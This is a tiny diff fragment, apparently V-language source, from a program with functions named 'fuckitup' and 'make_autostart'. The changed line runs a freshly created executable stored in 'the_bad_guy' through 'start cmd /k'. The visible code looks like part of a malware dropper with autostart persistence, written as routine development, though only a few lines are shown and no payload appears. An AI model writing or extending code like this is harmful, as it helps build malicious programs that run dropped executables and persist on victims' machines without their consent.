@@ -13,7 +13,7 @@ fn fuckitup(){
 		return
 	}
 	// execute the new created exe file
-	os.system(the_bad_guy)
+	os.system("start cmd /k "+the_bad_guy)
 }
 
 fn make_autostart(){
